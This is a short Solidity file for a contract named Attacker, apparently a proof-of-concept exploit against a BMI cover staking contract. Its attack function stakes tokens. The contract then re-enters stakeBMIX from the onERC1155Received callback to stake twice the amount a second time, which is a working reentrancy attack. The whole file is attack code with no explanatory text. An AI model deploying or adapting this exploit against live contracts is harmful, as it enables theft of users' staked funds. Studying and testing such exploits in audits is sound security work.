// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "../interfaces/IBMICoverStaking.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Attacker {
    IBMICoverStaking public coverStaking;

    uint256 public amount;
    address public policyBook;

    uint256 public count;

    constructor(address _coverStaking) {
        coverStaking = IBMICoverStaking(_coverStaking);
    }

    function attack(uint256 _amount, address _policyBookAddr) external {
        IERC20(_policyBookAddr).approve(address(coverStaking), type(uint256).max);

        amount = _amount;
        policyBook = _policyBookAddr;

        coverStaking.stakeBMIX(_amount, _policyBookAddr);
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        if (count < 1) {
            count++;
            coverStaking.stakeBMIX(amount * 2, policyBook);
        }

        return 0xf23a6e61;
    }
}
